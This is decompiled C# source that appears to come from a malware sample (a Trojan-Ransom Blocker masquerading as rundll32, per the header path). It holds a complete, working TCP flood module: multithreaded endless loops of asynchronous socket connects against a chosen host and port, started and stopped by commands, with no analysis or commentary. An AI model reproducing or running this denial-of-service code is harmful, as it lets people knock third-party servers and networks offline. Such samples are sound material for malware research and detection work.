// Decompiled with JetBrains decompiler
// Type: rundll32.floods.tcp
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace rundll32.floods
{
  internal class tcp
  {
    private static List<tcp.TcpFloodingthreads> _floods = new List<tcp.TcpFloodingthreads>();
    public static bool IsOn = false;
    public static int _MSDelay;

    public static bool start(string host, int port, int threads, int delay)
    {
      if (tcp.IsOn)
        return false;
      tcp.IsOn = true;
      tcp._MSDelay = delay;
      IPEndPoint ep;
      try
      {
        ep = new IPEndPoint(Dns.GetHostEntry(host).AddressList[0], port);
      }
      catch
      {
        ep = new IPEndPoint(IPAddress.Parse(host), port);
      }
      tcp.IsOn = true;
      for (int index = 0; index < threads; ++index)
        tcp._floods.Add(new tcp.TcpFloodingthreads(ep));
      return true;
    }

    public static bool stop()
    {
      if (!tcp.IsOn)
        return false;
      tcp.IsOn = false;
      foreach (tcp.TcpFloodingthreads flood in tcp._floods)
        flood.stopshit();
      return true;
    }

    internal class TcpFloodingthreads
    {
      private IPEndPoint _ep;
      private Thread _thisThread;

      public TcpFloodingthreads(IPEndPoint ep)
      {
        this._ep = ep;
        this._thisThread = new Thread(new ThreadStart(this._threadLoop));
        this._thisThread.Start();
      }

      public void stopshit()
      {
        try
        {
          this._thisThread.Suspend();
        }
        catch
        {
        }
      }

      private void _threadLoop()
      {
        while (true)
        {
          try
          {
            Socket state = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            state.Blocking = false;
            AsyncCallback callback = new AsyncCallback(tcp.TcpFloodingthreads.OnConnect);
            state.BeginConnect((EndPoint) this._ep, callback, (object) state);
            Thread.Sleep(tcp._MSDelay);
          }
          catch
          {
          }
        }
      }

      private static void OnConnect(IAsyncResult ar)
      {
      }
    }
  }
}
